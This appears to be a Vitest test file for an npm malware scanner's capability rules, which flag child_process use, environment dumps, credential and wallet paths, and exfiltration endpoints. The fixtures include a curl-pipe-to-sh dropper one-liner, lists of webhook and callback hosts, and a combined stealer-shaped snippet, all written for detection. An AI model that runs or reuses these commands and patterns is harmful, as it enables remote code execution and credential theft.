import { afterEach, describe, expect, it } from 'vitest';

import { CONTEXT_MODIFIERS } from '@/lib/engine/thresholds';
import {
  CAPABILITY_RULES,
  analyseCapability,
  deriveContextBucket,
  isRoutableLiteral,
} from '@/lib/engine/signals/capability';

import { buildContext, cleanupFixtures, firedIds, signalFor } from './fixture';

/**
 * FAMILY 3 — dangerous capability, weighted by declared purpose.
 *
 * SAFETY: the fixtures below contain the text of `require('child_process')`,
 * webhook URLs and credential paths. They are parsed and pattern-matched. No
 * module is loaded, no path is opened, and no URL is contacted.
 */

afterEach(cleanupFixtures);

const CLEAN_SOURCE = "const path = require('path');\nmodule.exports = path.join;\n";

// ---------------------------------------------------------------------------
// Context derivation
// ---------------------------------------------------------------------------

describe('deriveContextBucket', () => {
  const metadataFor = async (overrides: Parameters<typeof buildContext>[0]) =>
    (await buildContext(overrides)).artifact.metadata;

  it('classifies a bundler as a build tool', async () => {
    expect(deriveContextBucket(await metadataFor({ keywords: ['webpack', 'bundler'] }))).toBe(
      'BUILD_TOOL',
    );
  });

  it('classifies a shell wrapper as system', async () => {
    expect(deriveContextBucket(await metadataFor({ keywords: ['shell'] }))).toBe('SYSTEM');
  });

  it('classifies an http client as network', async () => {
    expect(deriveContextBucket(await metadataFor({ keywords: ['http'] }))).toBe('NETWORK');
  });

  it('classifies a framework package as framework', async () => {
    expect(deriveContextBucket(await metadataFor({ keywords: ['react'] }))).toBe('FRAMEWORK');
  });

  it('classifies a widely depended-upon package as framework regardless of keywords', async () => {
    expect(deriveContextBucket(await metadataFor({ dependentCount: 5000 }))).toBe('FRAMEWORK');
  });

  it('judges a package that declares nothing as a utility, strictly', async () => {
    const metadata = await metadataFor({ keywords: [], description: null });
    expect(deriveContextBucket(metadata)).toBe('UTILITY');
  });

  it('takes the most permissive bucket when a package claims several', async () => {
    // A package describing itself as both a bundler and an http client is
    // judged as a bundler; priority order decides, not declaration order.
    const metadata = await metadataFor({ keywords: ['http', 'bundler'] });
    expect(deriveContextBucket(metadata)).toBe('BUILD_TOOL');
  });
});

describe('isRoutableLiteral', () => {
  it.each(['0.0.0.0', '127.0.0.1', '10.1.2.3', '172.16.0.1', '192.168.1.1', '169.254.1.1'])(
    'rejects the non-routable address %s',
    (address) => {
      expect(isRoutableLiteral(address)).toBe(false);
    },
  );

  it.each(['192.0.2.1', '198.51.100.7', '203.0.113.9'])(
    'rejects the documentation address %s that appears in READMEs',
    (address) => {
      expect(isRoutableLiteral(address)).toBe(false);
    },
  );

  it('rejects multicast and reserved space', () => {
    expect(isRoutableLiteral('224.0.0.1')).toBe(false);
    expect(isRoutableLiteral('255.255.255.255')).toBe(false);
  });

  it('rejects a dotted quad with an out-of-range octet, e.g. a version string', () => {
    expect(isRoutableLiteral('1.2.3.400')).toBe(false);
  });

  it('accepts a real public address', () => {
    expect(isRoutableLiteral('93.184.216.34')).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// The family
// ---------------------------------------------------------------------------

describe('analyseCapability', () => {
  it('evaluates every rule in the family', async () => {
    const context = await buildContext({ files: [{ path: 'index.js', content: CLEAN_SOURCE }] });
    const { signals } = await analyseCapability(context);

    expect(signals.map((signal) => signal.ruleId).sort()).toEqual([...CAPABILITY_RULES].sort());
    expect(signals.every((signal) => signal.family === 'CAPABILITY')).toBe(true);
  });

  it('fires nothing on a package that only uses path', async () => {
    const context = await buildContext({ files: [{ path: 'index.js', content: CLEAN_SOURCE }] });
    const { signals } = await analyseCapability(context);

    expect([...firedIds(signals)]).toEqual([]);
  });

  describe('Q-CAP-001 — command execution', () => {
    it('fires on a child_process require', async () => {
      const context = await buildContext({
        files: [{ path: 'index.js', content: "const cp = require('child_process');\n" }],
      });
      const { signals } = await analyseCapability(context);

      expect(firedIds(signals).has('Q-CAP-001')).toBe(true);
      expect(signalFor(signals, 'Q-CAP-001').evidence[0]?.detail?.module).toBe('child_process');
    });

    it('fires on the node: prefixed form', async () => {
      const context = await buildContext({
        files: [{ path: 'index.js', content: "import { exec } from 'node:child_process';\n" }],
      });
      const { signals } = await analyseCapability(context);

      expect(firedIds(signals).has('Q-CAP-001')).toBe(true);
    });

    it('fires with lower confidence on an exec reached through a member expression', async () => {
      const context = await buildContext({
        files: [
          {
            path: 'index.js',
            content: "const vendor = require('./vendor');\nvendor.execSync('ls');\n",
          },
        ],
      });
      const { signals } = await analyseCapability(context);

      const signal = signalFor(signals, 'Q-CAP-001');
      expect(signal.fired).toBe(true);
      expect(signal.evidence[0]?.detail?.viaMember).toBe(true);
      expect(signal.confidence).toBeLessThan(0.9);
    });
  });

  describe('Q-CAP-002 — raw network access', () => {
    it.each(['net', 'node:net', 'dgram', 'dns', 'tls'])('fires on a %s import', async (module) => {
      const context = await buildContext({
        files: [{ path: 'index.js', content: `const m = require('${module}');\n` }],
      });
      const { signals } = await analyseCapability(context);

      expect(firedIds(signals).has('Q-CAP-002')).toBe(true);
    });

    it('does not fire on an ordinary http import, which is not raw socket access', async () => {
      const context = await buildContext({
        files: [{ path: 'index.js', content: "const http = require('http');\n" }],
      });
      const { signals } = await analyseCapability(context);

      expect(firedIds(signals).has('Q-CAP-002')).toBe(false);
    });
  });

  describe('Q-CAP-003 — vm and worker threads', () => {
    it.each(['vm', 'node:vm', 'worker_threads'])('fires on a %s import', async (module) => {
      const context = await buildContext({
        files: [{ path: 'index.js', content: `const m = require('${module}');\n` }],
      });
      const { signals } = await analyseCapability(context);

      expect(firedIds(signals).has('Q-CAP-003')).toBe(true);
    });
  });

  describe('Q-CAP-004 — wholesale environment access', () => {
    it('fires on enumerating the whole environment', async () => {
      const context = await buildContext({
        files: [{ path: 'index.js', content: 'const all = Object.keys(process.env);\n' }],
      });
      const { signals } = await analyseCapability(context);

      expect(firedIds(signals).has('Q-CAP-004')).toBe(true);
    });

    it('fires on spreading the environment into an object', async () => {
      const context = await buildContext({
        files: [{ path: 'index.js', content: 'const payload = { ...process.env };\n' }],
      });
      const { signals } = await analyseCapability(context);

      expect(firedIds(signals).has('Q-CAP-004')).toBe(true);
      expect(signalFor(signals, 'Q-CAP-004').evidence[0]?.detail?.pattern).toBe('spread');
    });

    it('does not fire on reading one variable, which is ordinary configuration', async () => {
      const context = await buildContext({
        files: [{ path: 'index.js', content: 'const level = process.env.LOG_LEVEL || "info";\n' }],
      });
      const { signals } = await analyseCapability(context);

      expect(firedIds(signals).has('Q-CAP-004')).toBe(false);
    });
  });

  describe('Q-CAP-005 — credential paths', () => {
    it.each([
      ['~/.ssh', "const key = process.env.HOME + '/.ssh/id_rsa';"],
      ['aws credentials', "const p = '/home/u/.aws/credentials';"],
      ['.npmrc', "const p = '.npmrc';"],
      ['kubeconfig', "const p = '.kube/config';"],
    ])('fires on %s', async (_label, content) => {
      const context = await buildContext({
        files: [{ path: 'index.js', content: `${content}\n` }],
      });
      const { signals } = await analyseCapability(context);

      expect(firedIds(signals).has('Q-CAP-005')).toBe(true);
    });

    it('names the target it recognised', async () => {
      const context = await buildContext({
        files: [{ path: 'index.js', content: "const p = '/home/u/.aws/credentials';\n" }],
      });
      const { signals } = await analyseCapability(context);

      expect(signalFor(signals, 'Q-CAP-005').evidence[0]?.detail?.target).toBe('aws credentials');
    });
  });

  describe('Q-CAP-006 — wallet paths', () => {
    it.each([
      ['wallet.dat', "const p = 'wallet.dat';"],
      ['.ethereum', "const p = '~/.ethereum/keystore';"],
      ['MetaMask', "const id = 'nkbihfbeogaeaoehlefnkodbefgpgknn';"],
      ['solana', "const p = '.config/solana/id.json';"],
    ])('fires on %s', async (_label, content) => {
      const context = await buildContext({
        files: [{ path: 'index.js', content: `${content}\n` }],
      });
      const { signals } = await analyseCapability(context);

      expect(firedIds(signals).has('Q-CAP-006')).toBe(true);
    });
  });

  describe('Q-CAP-007 — hardcoded addresses', () => {
    it('fires on a routable IP in something that looks like a network call', async () => {
      const context = await buildContext({
        files: [
          { path: 'index.js', content: "fetch('http://93.184.216.34:8080/collect', {});\n" },
        ],
      });
      const { signals } = await analyseCapability(context);

      expect(firedIds(signals).has('Q-CAP-007')).toBe(true);
      expect(signalFor(signals, 'Q-CAP-007').evidence[0]?.detail?.address).toBe('93.184.216.34');
    });

    it('does not fire on loopback in a test fixture', async () => {
      const context = await buildContext({
        files: [{ path: 'index.js', content: "const url = 'http://127.0.0.1:3000/';\n" }],
      });
      const { signals } = await analyseCapability(context);

      expect(firedIds(signals).has('Q-CAP-007')).toBe(false);
    });

    it('does not fire on a version-like quad with no network context', async () => {
      const context = await buildContext({
        files: [{ path: 'index.js', content: 'const version = "1.2.3.4";\n' }],
      });
      const { signals } = await analyseCapability(context);

      expect(firedIds(signals).has('Q-CAP-007')).toBe(false);
    });
  });

  describe('Q-CAP-008 — known exfiltration endpoints', () => {
    it.each([
      ['Discord webhook', 'https://discord.com/api/webhooks/1/abc'],
      ['Telegram bot API', 'https://api.telegram.org/bot123:AAA/sendMessage'],
      ['Slack webhook', 'https://hooks.slack.com/services/T/B/X'],
      ['webhook.site', 'https://webhook.site/abcd'],
      ['OAST callback host', 'https://abc.oast.fun/'],
      ['Burp Collaborator', 'https://abc.burpcollaborator.net/'],
    ])('fires on a %s URL', async (label, url) => {
      const context = await buildContext({
        files: [{ path: 'index.js', content: `const drop = '${url}';\n` }],
      });
      const { signals } = await analyseCapability(context);

      expect(firedIds(signals).has('Q-CAP-008')).toBe(true);
      expect(signalFor(signals, 'Q-CAP-008').evidence[0]?.detail?.endpoint).toBe(label);
    });

    it('does not fire on an ordinary API URL', async () => {
      const context = await buildContext({
        files: [{ path: 'index.js', content: "const api = 'https://registry.npmjs.org/x';\n" }],
      });
      const { signals } = await analyseCapability(context);

      expect(firedIds(signals).has('Q-CAP-008')).toBe(false);
    });
  });

  describe('Q-CAP-009 — undeclared native binaries', () => {
    it('fires on a .node binary in a package that never mentions native code', async () => {
      const context = await buildContext({
        files: [
          { path: 'index.js', content: CLEAN_SOURCE },
          { path: 'build/addon.node', content: Buffer.from([0, 1, 2, 3, 4, 5]) },
        ],
      });
      const { signals } = await analyseCapability(context);

      expect(firedIds(signals).has('Q-CAP-009')).toBe(true);
      expect(signalFor(signals, 'Q-CAP-009').evidence[0]?.file).toBe('build/addon.node');
    });

    it('carries the file hash, which is what campaign clustering needs', async () => {
      const context = await buildContext({
        files: [{ path: 'build/addon.node', content: Buffer.from([9, 9, 9]) }],
      });
      const { signals } = await analyseCapability(context);

      expect(String(signalFor(signals, 'Q-CAP-009').evidence[0]?.detail?.sha256)).toMatch(
        /^[a-f0-9]{64}$/,
      );
    });

    it('does not fire when the package declares a native build', async () => {
      const context = await buildContext({
        files: [
          { path: 'binding.gyp', content: '{ "targets": [] }' },
          { path: 'build/addon.node', content: Buffer.from([0, 1, 2]) },
        ],
      });
      const { signals } = await analyseCapability(context);

      expect(firedIds(signals).has('Q-CAP-009')).toBe(false);
    });

    it('does not fire when a native keyword explains the binary', async () => {
      const context = await buildContext({
        keywords: ['native', 'addon'],
        files: [{ path: 'build/addon.node', content: Buffer.from([0, 1, 2]) }],
      });
      const { signals } = await analyseCapability(context);

      expect(firedIds(signals).has('Q-CAP-009')).toBe(false);
    });
  });

  describe('the context modifier', () => {
    const EXEC_SOURCE = "const cp = require('child_process');\ncp.execSync('ls');\n";

    it('applies the utility multiplier to a package that declares nothing', async () => {
      const context = await buildContext({
        keywords: [],
        description: null,
        files: [{ path: 'index.js', content: EXEC_SOURCE }],
      });
      const { signals } = await analyseCapability(context);

      expect(signalFor(signals, 'Q-CAP-001').contextModifier).toBe(CONTEXT_MODIFIERS.UTILITY);
    });

    it('discounts the same capability in a package that declares itself a build tool', async () => {
      const context = await buildContext({
        keywords: ['webpack', 'bundler'],
        files: [{ path: 'index.js', content: EXEC_SOURCE }],
      });
      const { signals } = await analyseCapability(context);

      expect(signalFor(signals, 'Q-CAP-001').contextModifier).toBe(CONTEXT_MODIFIERS.BUILD_TOOL);
    });

    it('applies the modifier to every signal in the family, fired or not', async () => {
      const context = await buildContext({
        keywords: ['webpack'],
        files: [{ path: 'index.js', content: CLEAN_SOURCE }],
      });
      const { signals } = await analyseCapability(context);

      expect(
        signals.every((signal) => signal.contextModifier === CONTEXT_MODIFIERS.BUILD_TOOL),
      ).toBe(true);
    });

    it('never lets context erase a signal entirely', async () => {
      const context = await buildContext({
        keywords: ['webpack'],
        files: [{ path: 'index.js', content: EXEC_SOURCE }],
      });
      const { signals } = await analyseCapability(context);

      expect(signalFor(signals, 'Q-CAP-001').contextModifier).toBeGreaterThan(0);
    });
  });

  /**
   * Regression: inline `require('module').method()`.
   *
   * The dropper one-liner. It never binds the module to a name, so there is no
   * identifier for the member-expression path to root itself in — `calleeText`
   * returns null for a call-expression receiver, and `collectMemberExpressions`
   * never sees it. Q-CAP-001 catches it through `collectImports` instead, which
   * walks for *any* `require(<string literal>)` call anywhere in the tree
   * rather than only for a top-level binding.
   *
   * If this ever regresses, the most common shape in real npm malware stops
   * being detected while every named-import test still passes.
   */
  describe('inline require().method()', () => {
    const DROPPER =
      "module.exports = () => require('child_process').execSync('curl http://x.io/a|sh')\n";

    it('fires Q-CAP-001 on the unbound inline form', async () => {
      const context = await buildContext({ files: [{ path: 'index.js', content: DROPPER }] });
      const { signals } = await analyseCapability(context);

      expect(firedIds(signals).has('Q-CAP-001')).toBe(true);
    });

    it('attributes it to child_process at import confidence, not member confidence', async () => {
      const context = await buildContext({ files: [{ path: 'index.js', content: DROPPER }] });
      const { signals } = await analyseCapability(context);

      const signal = signalFor(signals, 'Q-CAP-001');
      expect(signal.evidence[0]?.detail).toMatchObject({
        module: 'child_process',
        kind: 'require',
      });
      // The import path is certain about what it saw; the member fallback is a
      // guess. A drop to 0.6 here would mean the import path stopped matching.
      expect(signal.confidence).toBeGreaterThan(0.9);
    });

    it('points at the file and line the call is on', async () => {
      const context = await buildContext({
        files: [{ path: 'lib/index.js', content: `// header\n${DROPPER}` }],
      });
      const { signals } = await analyseCapability(context);

      expect(signalFor(signals, 'Q-CAP-001').evidence[0]).toMatchObject({
        file: 'lib/index.js',
        startLine: 2,
      });
    });

    it('still fires when the specifier is node: prefixed', async () => {
      const context = await buildContext({
        files: [
          {
            path: 'index.js',
            content:
              "module.exports = () => require('node:child_process').execSync('curl http://x.io/a|sh')\n",
          },
        ],
      });
      const { signals } = await analyseCapability(context);

      expect(firedIds(signals).has('Q-CAP-001')).toBe(true);
    });

    it.each(['exec', 'spawn', 'execFileSync', 'fork'])(
      'fires regardless of which method the one-liner calls: %s',
      async (method) => {
        const context = await buildContext({
          files: [
            { path: 'index.js', content: `require('child_process').${method}('id')\n` },
          ],
        });
        const { signals } = await analyseCapability(context);

        expect(firedIds(signals).has('Q-CAP-001')).toBe(true);
      },
    );
  });

  it('finds the whole stealer shape in one pass', async () => {
    const context = await buildContext({
      files: [
        {
          path: 'index.js',
          content: [
            "const cp = require('child_process');",
            "const key = process.env.HOME + '/.ssh/id_rsa';",
            "const drop = 'https://discord.com/api/webhooks/1/abc';",
            'const env = { ...process.env };',
            '',
          ].join('\n'),
        },
      ],
    });
    const { signals } = await analyseCapability(context);
    const ids = firedIds(signals);

    for (const ruleId of ['Q-CAP-001', 'Q-CAP-004', 'Q-CAP-005', 'Q-CAP-008']) {
      expect(ids.has(ruleId)).toBe(true);
    }
  });
});
